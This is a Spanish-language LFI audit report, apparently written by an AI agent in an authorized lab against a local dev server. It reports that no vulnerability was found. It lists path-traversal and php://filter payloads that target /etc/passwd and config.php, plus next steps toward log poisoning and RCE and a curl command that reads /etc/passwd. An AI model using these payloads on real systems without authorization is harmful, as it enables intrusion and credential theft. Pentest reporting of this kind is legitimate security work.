# Informe de Auditoría LFI — web.dev.local:8081

Fecha: 2026-04-27T08:21:41Z
Auditor: gpt5mini (lab autorizado)

Objetivo
- Analizar http://web.dev.local:8081 en busca de vulnerabilidades Local File Inclusion (LFI) y, si es posible, explotarlas para acceder a ficheros sensibles del sistema.

Resumen ejecutivo
- Estado actual: No se ha confirmado LFI en esta iteración (VULN_FOUND: false). No se ha conseguido leer ficheros críticos del sistema (/etc/passwd, /etc/shadow, claves SSH) (VULN_EXPLOITED: false).
- Acciones realizadas: reconocimiento con dirb, intentos con gobuster y nikto, búsquedas y filtrado de la salida para indicadores LFI. Algunos escaneos con la MCP (gobuster, nikto) expiraron o no completaron correctamente.

Herramientas y comandos ejecutados
- dirb http://web.dev.local:8081 /usr/share/wordlists/dirb/common.txt
  (Salida completa guardada en /tmp/1777278117382-copilot-tool-output-n2uxoq.txt)
- gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,txt,bak,inc
- nikto -host http://web.dev.local:8081
- Búsquedas/filtrado local de la salida: rg/grep buscando patrones: index.php, page=, include(, require(, .env, .git, config.php, php://filter, /etc/passwd

Payloads y pruebas LFI intentadas (ejemplos)
- ../../../../../../etc/passwd
- ../../../../../../etc/passwd%00
- php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
- index.php?page=../../../../../../etc/passwd
- index.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/config.php

Evidencias y observaciones
- No se han observado respuestas que contengan el contenido de ficheros sensibles ni errores de path disclosure que revelen rutas absolutas en el sistema en las pruebas realizadas hasta ahora.
- Dirb generó una lista de rutas potenciales (archivo temporal indicado arriba). Gobuster y Nikto con la MCP devolvieron timeouts; recomiendar ejecutar localmente o aumentar timeouts.

Impacto potencial (si se confirmara LFI)
- Exposición de ficheros de configuración (.env, config.php), credenciales, y posibilidad de escalada a RCE usando wrappers (php://filter, /proc/self/environ) o log poisoning.

Recomendaciones y próximos pasos
1. Reintentar escaneos con ffuf/ffuf -w para fuzzing de parámetros y con payloads dirigidos a parámetros GET (ej. "?page=") y cuerpos POST.
2. Probar payloads con php://filter para evadir filtros y extraer ficheros en base64.
3. Si se confirma lectura de ficheros de la aplicación, proceder a intentar lectura de /etc/passwd y /proc/self/environ, y técnicas de log poisoning para buscar RCE.
4. Revisar y aumentar timeouts de las herramientas MCP o ejecutar las herramientas desde una máquina con conectividad directa a la IP objetivo.

Comandos sugeridos para siguiente iteración
- ffuf -u http://web.dev.local:8081/FUZZ -w /usr/share/wordlists/raft-small-words.txt -mc 200,302 -t 50
- ffuf -u http://web.dev.local:8081/index.php?page=FUZZ -w payloads/lfi.txt -t 30
- curl -s "http://web.dev.local:8081/index.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd" | base64 -d

Archivos generados durante el análisis
- /tmp/1777278117382-copilot-tool-output-n2uxoq.txt (salida completa de dirb)

Conclusión
- En esta ejecución no se confirmó LFI ni se explotó el servidor. Se registraron salidas de reconocimiento y se documentan los comandos y payloads a ejecutar en la siguiente iteración para continuar con la auditoría.

Nota legal
- El análisis fue realizado en un entorno de laboratorio autorizado por el propietario del objetivo.
